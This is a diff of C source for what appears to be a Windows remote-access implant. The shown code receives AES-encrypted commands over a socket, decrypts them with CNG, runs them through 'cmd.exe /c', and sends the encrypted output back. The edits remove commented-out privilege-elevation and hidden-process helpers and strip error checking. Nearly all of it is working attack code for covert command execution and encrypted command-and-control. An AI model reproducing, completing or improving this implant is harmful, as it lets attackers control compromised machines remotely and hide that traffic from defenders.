@@ -22,42 +22,6 @@
 #define KEYLEN 32
 #define IVLEN 16
 
-#define NT_SUCCESS(Status)          (((NTSTATUS)(Status)) >= 0)
-
-#define STATUS_UNSUCCESSFUL         ((NTSTATUS)0xC0000001L)
-
-// BOOL IsUserAdmin()
-// {
-//     BOOL isAdmin = FALSE;
-//     PSID administratorsGroup = NULL;
-//
-//     SID_IDENTIFIER_AUTHORITY NtAuthority = SECURITY_NT_AUTHORITY;
-//     if (AllocateAndInitializeSid(&NtAuthority, 2, SECURITY_BUILTIN_DOMAIN_RID, DOMAIN_ALIAS_RID_ADMINS, 0, 0, 0, 0, 0, 0, &administratorsGroup))
-//     {
-//         CheckTokenMembership(NULL, administratorsGroup, &isAdmin);
-//         FreeSid(administratorsGroup);
-//     }
-//
-//     return isAdmin;
-// }
-//
-// void PrintError()
-// {
-//     printf("Error code is: %d\n", GetLastError());
-// }
-//
-// void appendNull(char **str)
-// {
-//     *str[strlen(*str) - 1] = '\0';
-// }
-
-// void appendStr(char **dest, const char *src)
-// {
-//     size_t newLen = strlen(*dest) + strlen(src) + 1;
-//     *dest = realloc(*dest, newLen);
-//     strcat(*dest, src);
-// }
-
 // void ELEVATE()
 // {
 //     if(IsUserAdmin())
@@ -82,22 +46,6 @@
 //         printf("ShellExecuteEx Failed: %lu\n", GetLastError());
 //         return;
 //     }
-// }
-
-// void EXECCOMMWOO(char *command)
-// {
-//     STARTUPINFO si;
-//     PROCESS_INFORMATION pi;
-//
-//     ZeroMemory(&si, sizeof(si));
-//     si.cb = sizeof(si);
-//     ZeroMemory(&pi, sizeof(pi));
-//
-//     CreateProcess(NULL, command, NULL, NULL, TRUE, CREATE_NO_WINDOW, NULL, NULL, &si, &pi);
-//     WaitForSingleObject(pi.hProcess, INFINITE);
-//
-//     CloseHandle(pi.hProcess);
-//     CloseHandle(pi.hThread);
 // }
 
 void sendall(int sockfd, unsigned char* buffer, size_t length)
@@ -170,31 +118,9 @@ int CNG_AES256_CBC_Encrypt(unsigned const* plaintext, unsigned char* key, unsign
         pbKeyObject = NULL,
         pbIV = NULL;
 
-    //printf("key output: ");
-    //for (size_t i = 0; i < 32; i++) {
-    //    printf("%02x", key[i]);  // Lowercase hex, zero-padded
-    //    // printf("%02X", bytes[i]);  // Use this for uppercase hex
-    //}
-    //printf("\n");
-
-    //printf("IV output: ");
-    //for (size_t i = 0; i < 16; i++) {
-    //    printf("%02x", iv[i]);  // Lowercase hex, zero-padded
-    //    // printf("%02X", bytes[i]);  // Use this for uppercase hex
-    //}
-    //printf("\n");
-
     status = BCryptOpenAlgorithmProvider(&hAesAlg, BCRYPT_AES_ALGORITHM, NULL, 0);
-    if (!NT_SUCCESS(status))
-    {
-        wprintf(L"**** Error 0x%x returned\n", status);
-    }
-
 	status = BCryptGetProperty(hAesAlg, BCRYPT_OBJECT_LENGTH, (PBYTE)&cbKeyObject, sizeof(DWORD), &cbData, 0);
-    if (!NT_SUCCESS(status))
-    {
-        wprintf(L"**** Error 0x%x returned\n", status);
-    }
+
     pbKeyObject = (PBYTE)HeapAlloc(GetProcessHeap(), 0, cbKeyObject);
 
     cbPlaintext = strlen(plaintext);
@@ -205,26 +131,12 @@ int CNG_AES256_CBC_Encrypt(unsigned const* plaintext, unsigned char* key, unsign
     memcpy(pbIV, iv, IVLEN);
 
     status = BCryptSetProperty(hAesAlg, BCRYPT_CHAINING_MODE, (PBYTE)BCRYPT_CHAIN_MODE_CBC, sizeof(BCRYPT_CHAIN_MODE_CBC), 0);
-    if (!NT_SUCCESS(status))
-    {
-        wprintf(L"**** Error 0x%x returned\n", status);
-    }
     status = BCryptGenerateSymmetricKey(hAesAlg, &hKey, pbKeyObject, cbKeyObject, (PBYTE)key, KEYLEN, 0);
-    if (!NT_SUCCESS(status))
-    {
-        wprintf(L"**** Error 0x%x returned\n", status);
-    }
     status = BCryptEncrypt(hKey, pbPlaintext, cbPlaintext, NULL, pbIV, IVLEN, NULL, 0, &cbCiphertext, BCRYPT_BLOCK_PADDING); 
-    if (!NT_SUCCESS(status))
-    {
-        wprintf(L"**** Error 0x%x returned\n", status);
-    }
+    
     pbCiphertext = (PBYTE)HeapAlloc(GetProcessHeap(), 0, cbCiphertext);
     status = BCryptEncrypt(hKey, pbPlaintext, cbPlaintext, NULL, pbIV, IVLEN, pbCiphertext, cbCiphertext, &cbData, BCRYPT_BLOCK_PADDING);
-    if (!NT_SUCCESS(status))
-    {
-        wprintf(L"**** Error 0x%x returned\n", status);
-    }
+
     //Swapping cbCiphertext to free it
     memcpy(ciphertext, pbCiphertext, cbData);
     int ciphertextLen = cbData;
@@ -281,16 +193,7 @@ int CNG_AES256_CBC_Decrypt(unsigned char* ciphertext, int ciphertextLen, unsigne
 
 
     status = BCryptOpenAlgorithmProvider(&hAesAlg, BCRYPT_AES_ALGORITHM, NULL, 0);
-    if (!NT_SUCCESS(status))
-    {
-        wprintf(L"**** Error 0x%x returned 1\n", status);
-    }
-
     status = BCryptGetProperty(hAesAlg, BCRYPT_OBJECT_LENGTH, (PBYTE) &cbKeyObject, sizeof(DWORD), &cbData, 0);
-    if (!NT_SUCCESS(status))
-    {
-        wprintf(L"**** Error 0x%x returned 2\n", status);
-    }
     pbKeyObject = HeapAlloc(GetProcessHeap(), 0, cbKeyObject);
 
     pbIV = HeapAlloc(GetProcessHeap(), 0, IVLEN);
@@ -301,29 +204,13 @@ int CNG_AES256_CBC_Decrypt(unsigned char* ciphertext, int ciphertextLen, unsigne
     memcpy(pbCiphertext, ciphertext, cbCiphertext);
 
     status = BCryptSetProperty(hAesAlg, BCRYPT_CHAINING_MODE, (PBYTE)BCRYPT_CHAIN_MODE_CBC, sizeof(BCRYPT_CHAIN_MODE_CBC), 0);
-    if (!NT_SUCCESS(status))
-    {
-        wprintf(L"**** Error 0x%x returned 3\n", status);
-    }
     status = BCryptGenerateSymmetricKey(hAesAlg, &hKey, pbKeyObject, cbKeyObject, (PBYTE)key, KEYLEN, 0);
-    if (!NT_SUCCESS(status))
-    {
-        wprintf(L"**** Error 0x%x returned 4\n", status);
-    }
-
     status = BCryptDecrypt(hKey, pbCiphertext, cbCiphertext, NULL, pbIV, IVLEN, NULL, 0, &cbPlaintext, BCRYPT_BLOCK_PADDING);
-    if (!NT_SUCCESS(status))
-    {
-        wprintf(L"**** Error 0x%x returned 5\n", status);
-    }
+    
     pbPlaintext = HeapAlloc(GetProcessHeap(), 0, cbPlaintext);
     memset(pbPlaintext, 0, cbPlaintext);
     status = BCryptDecrypt(hKey, pbCiphertext, cbCiphertext, NULL, pbIV, IVLEN, pbPlaintext, cbPlaintext, &cbData, BCRYPT_BLOCK_PADDING);
-    if (!NT_SUCCESS(status))
-    {
-        wprintf(L"**** Error 0x%x returned 6\n", status);
-    }
-
+    
     //Swapping values to free them
     memcpy(plaintext, pbPlaintext, cbData);
     int plaintextLen = cbData;
@@ -392,9 +279,6 @@ char* CMD_Execute_Command(char* command, size_t* resultLen)
     char fullCmdLine[BUFSIZE];
     snprintf(fullCmdLine, BUFSIZE, "cmd.exe /c %s", command);
 
-    //wchar_t wCmdLine[BUFSIZE];
-    //mbstowcs(wCmdLine, fullCmdLine, BUFSIZE);
-    
     wchar_t wCmdLine[BUFSIZE];
     MultiByteToWideChar(CP_UTF8, 0, fullCmdLine, -1, wCmdLine, BUFSIZE);
 
@@ -502,11 +386,7 @@ int APIENTRY WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lCmdLin
         memcpy(aesCiphertext, recvAESText, ciphertextCommandLen);
         memcpy(iv, recvAESText + ciphertextCommandLen, EVP_MAX_IV_LENGTH);
 
-        /*unsigned char* plaintextCommand = malloc(ciphertextCommandLen + EVP_MAX_BLOCK_LENGTH);
-        int plaintextCommandLen = decryptAES(aesCiphertext, ciphertextCommandLen, aes_key, iv, &plaintextCommand);
-        plaintextCommand[plaintextCommandLen] = '\0';*/
-
-        unsigned char* plaintextCommand = malloc(ciphertextCommandLen);
+        unsigned char* plaintextCommand = malloc(ciphertextCommandLen + EVP_MAX_BLOCK_LENGTH);
         int plaintextCommandLen = CNG_AES256_CBC_Decrypt(aesCiphertext, ciphertextCommandLen, aes_key, iv, plaintextCommand);
         plaintextCommand[plaintextCommandLen] = '\0';
 
@@ -521,7 +401,6 @@ int APIENTRY WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lCmdLin
             char* result = CMD_Execute_Command(plaintextCommand, &resultLen);
 
             unsigned char* sendCiphertext = malloc(resultLen + 16);
-            // int sendCiphertextLen = encryptAES(result, resultLen, aes_key, iv, &sendCiphertext);
             int sendCiphertextLen = CNG_AES256_CBC_Encrypt(result, aes_key, iv, sendCiphertext);
             
             //TODO: Switch to 13 bytes
